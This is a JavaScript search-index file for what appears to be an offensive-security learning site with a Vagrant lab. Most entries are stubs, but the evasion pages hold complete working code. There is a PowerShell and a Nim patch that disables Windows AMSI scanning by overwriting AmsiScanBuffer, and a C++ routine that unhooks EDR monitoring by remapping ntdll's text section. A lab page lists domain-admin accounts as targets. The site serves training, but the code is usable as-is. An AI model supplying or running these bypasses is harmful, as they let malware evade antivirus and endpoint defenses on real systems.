'use strict';(function(){const b={cache:!0};b.doc={id:'id',field:['title','content'],store:['title','href','section']};const a=FlexSearch.create('balance',b);window.bookSearchIndex=a,a.add({id:0,href:'/docs/windows/fundamentals/',title:"Fundamentals",section:"Windows",content:"Fundamentals #  "}),a.add({id:1,href:'/docs/lab/',title:"Lab",section:"Docs",content:"Lab #  TODO Add link to vagrant install and usage docs.  Included with this set of learning is a lab environment using vagrant and packer.\nStarting the lab #  Starting the lab takes one command.\n$ vagrant up Not all of the lab needs to be started at the same time.\n$ vagrant up dc1 Stopping the lab #  Some or all machines can be stopped the same way\n$ vagrant halt [name] Cleaning up #  Use the following command to unregister the VMs from your system and free up some disk space.\n$ vagrant destroy "}),a.add({id:2,href:'/docs/windows/fundamentals/logonsessions-tokens/',title:"Logon Sessions and Access Tokens",section:"Fundamentals",content:"Logon Sessions \u0026amp; Access Tokens #  User sessions are controlled by the Local Security Authority (LSA). This creates a Logon Session for each user, and builds an Access Token for the session.\nLogon Sessions #  Tools:\n  https://docs.microsoft.com/en-us/sysinternals/downloads/logonsessions  Access Tokens #  Tools:\n  https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/tree/master/TokenViewer  References #    https://www.elastic.co/blog/introduction-to-windows-tokens-for-security-practitioners  https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/  ATT\u0026amp;CK T1134 Access Token Manipulation  "}),a.add({id:3,href:'/docs/lab/users/',title:"Users",section:"Lab",content:"Users #  vagrant #  Don\u0026rsquo;t use this, use Tony. If you need a quick DA though, this is here.\nHoward #  The main DA to compromise. Password is random, but follows a format.\nMaria #  The backup DA. Password is static.\nTony #  Average user. Uses station1 most of the time.\n"}),a.add({id:4,href:'/docs/lab/machines/dc1/',title:"DC1",section:"Machines",content:"DC1 #  This is the Primary Domain Controller for the lab.\n"}),a.add({id:5,href:'/docs/windows/evasion/',title:"Evasion",section:"Windows",content:"Evasion #  Evading anti-virus and EDR solutions comes in many forms, from simply patching functions to unhooking DLLs.\n"}),a.add({id:6,href:'/docs/recon/',title:"Recon",section:"Docs",content:"Reconnaissance #  Reconnaissance, or \u0026ldquo;recon\u0026rdquo; for short, is a collection of techniques that can be run from a local attacker system, or a remote attacker controlled system.\n"}),a.add({id:7,href:'/docs/web/',title:"Web",section:"Docs",content:"Web #  TODO Consider the following:\n https://owasp.org/www-project-top-ten/   "}),a.add({id:8,href:'/docs/windows/evasion/amsi/',title:"AMSI",section:"Evasion",content:"AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.\nPatching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.\nThe basic process here is:\n Use LoadLibrary to read amsi.dll from disk into a known variable handle. Use GetProcAddress to identify the address of the AmsiScanBuffer function. Since amsi.dll should have already been loaded into the process at process start, this should be the address to the function already active in memory. Use VirtualProtect to make the memory containing the AmsiScanBuffer function writable (0x40 == PAGE_EXECUTE_READWRITE). Just copy over the byte code for a simple replacement function.  Replacement function:\nb8 57 00 07 80 mov eax,0x80070057 # AMSI_RESULT_CLEAN c3 ret This replacement function is just two asm calls that push AMSI_RESULT_CLEAN into eax and return. This makes any call to AmsiScanBuffer succeed as if the file was clean.\nPowershell #  In powershell, patching AmsiScanBuffer basically means calling out to a little C# code to do the heavy work of calling Win32 APIs to patch the function in the current process.\nExample # Credit: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsidll-amsiscanbuffer-by-rasta-mouse $Win32 = @\u0026#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(\u0026#34;kernel32\u0026#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \u0026#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\u0026#34;am\u0026#34; + \u0026#34;si.dll\u0026#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, \u0026#34;Amsi\u0026#34; + \u0026#34;Scan\u0026#34; + \u0026#34;Buffer\u0026#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) Source: amsi_powershell_rasta.ps1\n  References:\n  https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/  Nim #  Example #[ Author: Marcello Salvati, Twitter: @byt3bl33d3r License: BSD 3-Clause Credit: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim ]# import winim/lean import strformat import dynlib when defined amd64: echo \u0026#34;[*] Running in x64 process\u0026#34; const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] elif defined i386: echo \u0026#34;[*] Running in x86 process\u0026#34; const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00] proc PatchAmsi(): bool = var amsi: LibHandle cs: pointer op: DWORD t: DWORD disabled: bool = false # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything\u0026#39;s ok (which you can\u0026#39;t really do well when using LoadLibrary() directly through winim) amsi = loadLib(\u0026#34;amsi\u0026#34;) if isNil(amsi): echo \u0026#34;[X] Failed to load amsi.dll\u0026#34; return disabled cs = amsi.symAddr(\u0026#34;AmsiScanBuffer\u0026#34;) # equivalent of GetProcAddress() if isNil(cs): echo \u0026#34;[X] Failed to get the address of \u0026#39;AmsiScanBuffer\u0026#39;\u0026#34; return disabled if VirtualProtect(cs, patch.len, 0x40, addr op): echo \u0026#34;[*] Applying patch\u0026#34; copyMem(cs, unsafeAddr patch, patch.len) VirtualProtect(cs, patch.len, op, addr t) disabled = true return disabled when isMainModule: var success = PatchAmsi() echo fmt\u0026#34;[*] AMSI disabled: {bool(success)}\u0026#34; Source: amsi_nim_offensivenim.nim\n  Further Reading #    https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/  References #    https://onlinedisassembler.com/odaweb/majaEeX0/0  https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants  http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html  "}),a.add({id:10,href:'/docs/linux/',title:"Linux",section:"Docs",content:"Linux #  "}),a.add({id:11,href:'/docs/lab/machines/',title:"Machines",section:"Lab",content:"Machines #  "}),a.add({id:12,href:'/docs/recon/tools/',title:"Tools",section:"Recon",content:"Tools #  "}),a.add({id:14,href:'/docs/windows/evasion/unhooking/',title:"Unhooking EDR DLLs",section:"Evasion",content:"Unhooking EDR DLLs #  Endpoint Detection and Response solutions are basically enhanced anti-virus products. They usually have a kernel driver watching the creation of processes then inject their own DLL into the process that then hooks a shim in place of functions loaded by other DLLs in order to detect malicious or unwanted programs based on their API calls.\nA simple example is to hook VirtualProtect from ntdll.dll and watch for calls to set an area of memory PAGE_EXECUTE_READWRITE and if so, terminate the process. This is done with the SylantStrike project.\n\u0026ldquo;Unhooking\u0026rdquo; refers to mapping the original function call back to its original location and leaving the shim left in unreferenced memory.\nC# #  Example # Credit: https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++ #include \u0026#34;pch.h\u0026#34;#include \u0026lt;iostream\u0026gt;#include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winternl.h\u0026gt;#include \u0026lt;psapi.h\u0026gt; int main() { HANDLE process = GetCurrentProcess(); MODULEINFO mi = {}; HMODULE ntdllModule = GetModuleHandleA(\u0026#34;ntdll.dll\u0026#34;); GetModuleInformation(process, ntdllModule, \u0026amp;mi, sizeof(mi)); LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll; HANDLE ntdllFile = CreateFileA(\u0026#34;c:\\\\windows\\\\system32\\\\ntdll.dll\u0026#34;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL); LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0); PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase; PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-\u0026gt;e_lfanew); for (WORD i = 0; i \u0026lt; hookedNtHeader-\u0026gt;FileHeader.NumberOfSections; i++) { PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i)); if (!strcmp((char*)hookedSectionHeader-\u0026gt;Name, (char*)\u0026#34;.text\u0026#34;)) { DWORD oldProtection = 0; bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress), hookedSectionHeader-\u0026gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtection); memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress), hookedSectionHeader-\u0026gt;Misc.VirtualSize); isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-\u0026gt;VirtualAddress), hookedSectionHeader-\u0026gt;Misc.VirtualSize, oldProtection, \u0026amp;oldProtection); } } CloseHandle(process); CloseHandle(ntdllFile); CloseHandle(ntdllMapping); FreeLibrary(ntdllModule); return 0; } Source: unhook_csharp.cs\n  References #  "}),a.add({id:16,href:'/docs/windows/',title:"Windows",section:"Docs",content:"Windows #  "})})()